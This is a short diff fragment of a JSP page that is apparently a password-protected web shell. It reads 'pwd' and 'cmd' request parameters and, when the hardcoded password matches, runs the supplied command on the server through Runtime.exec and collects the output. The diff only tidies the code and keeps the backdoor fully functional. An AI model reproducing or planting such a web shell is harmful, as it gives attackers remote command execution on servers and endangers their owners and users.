@@ -3,13 +3,12 @@
 <%
     String pwd = request.getParameter("pwd");
     String cmd = request.getParameter("cmd");
-    Runtime r = java.lang.Runtime.getRuntime(); 
-    String output = "";
     if((pwd != null) && (cmd != null)) {
         if (pwd.equals("sdkfsdjfkdsfiek")){
-            String s = null;
+            String output = "";
+            String s = "";
             try {
-                Process p = r.exec(cmd);
+                Process p = java.lang.Runtime.getRuntime().exec(cmd);
                 BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
                 while((s = sI.readLine()) != null) {
                     output += s +"\r\n";
